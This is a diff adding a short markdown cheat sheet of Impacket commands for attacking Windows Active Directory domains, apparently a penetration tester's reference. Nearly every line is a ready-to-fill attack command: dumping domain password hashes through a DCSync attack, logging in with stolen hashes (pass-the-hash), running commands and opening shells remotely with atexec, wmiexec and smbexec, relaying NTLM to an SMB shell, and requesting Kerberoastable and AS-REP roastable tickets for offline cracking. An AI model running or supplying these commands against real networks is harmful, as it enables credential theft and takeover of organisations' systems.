@@ -1,0 +1,27 @@
+# Multiple ways to obtain more information on a domain or obtain hashes using Impacket scripts
+
+### Dump hashes with secretsdump.py (Performing a DCSync attack) ###
+secretsdump.py [DOMAIN]/[USER]@[IP] -just-dc
+
+### Login in with a user's hash (Pass The Hash Technique) ###
+psexec.py [USER]@[IP] -hashes [FULL:HASH]
+
+### Using AtExec to run a command remotely ###
+atexec.py [DOMAIN]/[USER]@[IP] [COMMAND]
+
+### Using WMIExec to get a shell and run a command remotely ###
+wmiexec.py [DOMAIN]/[USER]@[IP]
+wmiexec.py [DOMAIN]/[USER]@[IP] [COMMAND]
+
+### Using SMBExec to get a shell ###
+smbexec.py [DOMAIN]/[USER]@[IP]
+
+### Obtaining an interactive SMB shell using NTLMRelay ###
+ntlmrelayx.py -tf targets.txt -smb2support -i
+
+### Find Kerberoastable accounts ###
+GetUserSPNs.py [DOMAIN]/[USER] -no-pass -dc-ip [IP]
+GetUserSPNs.py -request -dc-ip [IP] [DOMAIN]/[USER]
+
+### List the non-preauth ASREP responses for a given list of usernames ###
+GetNPUsers [DOMAIN]/ -usersfile user.txt -dc-ip [IP] 
